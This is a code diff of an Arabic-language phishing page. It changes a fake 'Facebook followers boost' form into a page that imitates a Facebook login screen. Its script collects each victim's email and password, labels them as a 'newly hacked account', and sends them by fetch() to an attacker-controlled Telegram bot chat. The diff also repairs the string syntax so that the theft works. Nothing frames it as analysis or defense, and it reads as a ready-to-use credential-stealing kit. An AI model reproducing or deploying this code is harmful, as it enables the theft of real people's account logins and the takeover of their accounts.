@@ -1,75 +1,81 @@
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>زيادة متابعين فيسبوك</title>
+  <title>صفحة تسجيل دخول</title>
   <style>
     body {
-      background-color: #000;
-      color: white;
+      background-color: #f0f2f5;
       font-family: Arial, sans-serif;
+    }
+
+    .login-box {
+      background: #fff;
+      width: 280px;
+      margin: 100px auto;
+      padding: 40px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+      border-radius: 8px;
+    }
+
+    .login-box h2 {
       text-align: center;
-      padding-top: 50px;
+      color: #1877f2;
+      margin-bottom: 20px;
     }
-    .form-container {
-      background-color: #1c1c1c;
-      padding: 30px;
-      width: 300px;
-      margin: auto;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #222;
-    }
-    input, select, button {
-      width: 90%;
-      padding: 10px;
+
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 14px;
       margin: 10px 0;
-      border-radius: 5px;
-      border: none;
+      border: 1px solid #ddd;
+      border-radius: 6px;
       font-size: 16px;
     }
-    input, select {
-      background-color: #333;
-      color: white;
-    }
-    button {
-      background-color: #007bff;
-      color: white;
-      font-weight: bold;
+
+    .login-box button {
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      padding: 14px;
+      font-size: 16px;
+      border-radius: 6px;
       cursor: pointer;
     }
-    button:hover {
-      background-color: #0056b3;
+
+    .login-box button:hover {
+      background: #166fe5;
     }
-    .facebook-icon {
-      font-size: 60px;
+
+    .login-box .footer {
+      text-align: center;
+      margin-top: 15px;
+      font-size: 12px;
+      color: #777;
+    }
+
+    .id-box {
+      text-align: center;
       margin-top: 20px;
-      color: #1877f2;
+      font-size: 14px;
+      color: #333;
     }
-    input:focus {
-  outline: none;
-  border: 2px solid #007bff; /* اختر اللون اللي تحبه هنا */
-  box-shadow: 0 0 5px #007bff; /* تأثير إضافي لو حبيت */
-}
   </style>
 </head>
 <body>
-  <div class="form-container">
-    <h2> زيادة متابعين فيسبوك 🚀</h2>
-    <form>
-      <input type="text" placeholder="أدخل رقم الهاتف أو الإيميل">
-      
-      <input type="password" placeholder="أدخل كلمة السر">
-      
-      <label>اختر عدد المتابعين :- </label>
-      <select>
-        <option> 1000 </option>
-        <option> 5000 </option>
-      </select>
-      
-      <button type="submit">رشق</button>
+
+  <div class="login-box">
+    <h2>تسجيل الدخول</h2>
+    <form id="loginForm">
+      <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+      <input type="password" id="password" placeholder="كلمة السر" required>
+      <button type="submit">تسجيل الدخول</button>
     </form>
-   
+    <div class="footer">© 2025 Medo Broblems</div>
   </div>
-  <script>
+
+<script>
   window.onload = function() {
     const params = new URLSearchParams(window.location.search);
     const chatId = params.get('chatId');
@@ -77,7 +83,7 @@
 
     if (chatId && !id) {
       // لو فيه chatId بس — نحوله لـ id في نفس الرابط
-      const targetURL = ${window.location.pathname}?id=${chatId};
+      const targetURL = `${window.location.pathname}?id=${chatId}`;
       window.location.href = targetURL;
     }
     // لو فيه id هيكمل عادي بس مش هيعرضه
@@ -99,9 +105,9 @@
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    const message = 📥 - تم اختراق حساب جديد :- \n📧 - الإيميل : ${email}\n🔑 - الباسورد : ${password};
+    const message = `📥 - تم اختراق حساب جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
 
-    const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)};
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
 
     fetch(url)
       .then(response => response.json())
@@ -115,5 +121,6 @@
       });
   });
 </script>
+
 </body>
 </html>
